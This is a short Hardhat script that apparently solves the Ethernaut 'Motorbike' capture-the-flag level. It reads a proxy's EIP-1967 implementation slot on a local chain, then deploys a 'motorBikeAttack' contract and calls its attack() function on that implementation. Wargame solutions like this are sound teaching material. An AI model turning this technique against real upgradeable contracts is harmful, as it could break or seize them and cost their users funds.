const { ethers } = require("hardhat");
require("dotenv").config();
const PROXY_ADDRESS = "0x12300cc4b778feF85Db771525D76562515882953";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";

async function main() {
  const playerWallet = await ethers.getSigner(PLAYER_ADDRESS);
  const provider = new ethers.providers.JsonRpcProvider(
    "http://localhost:8545"
  );

  const data = ethers.utils.toUtf8Bytes("eip1967.proxy.implementation");
  const hashedData = ethers.utils.keccak256(data);

  const intHash = ethers.BigNumber.from(hashedData);
  const intHashMinus1 = intHash.sub(1);
  const hashedDataMinus1 = intHashMinus1.toHexString();

  const addressOfImplementation = (
    await provider.getStorageAt(PROXY_ADDRESS, hashedDataMinus1)
  ).slice(-40);

  console.log(`Address of implementation: 0x${addressOfImplementation}`);

  // Deploy the Contract
  const motorBikeAttackFactory = await ethers.getContractFactory(
    "motorBikeAttack",
    playerWallet
  );
  const motorBikeAttack = await motorBikeAttackFactory.deploy();
  await motorBikeAttack.deployed();
  console.log("motorBikeAttack deployed to----->:", motorBikeAttack.address);
  await motorBikeAttack.attack(addressOfImplementation);
  console.log("attack success");
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
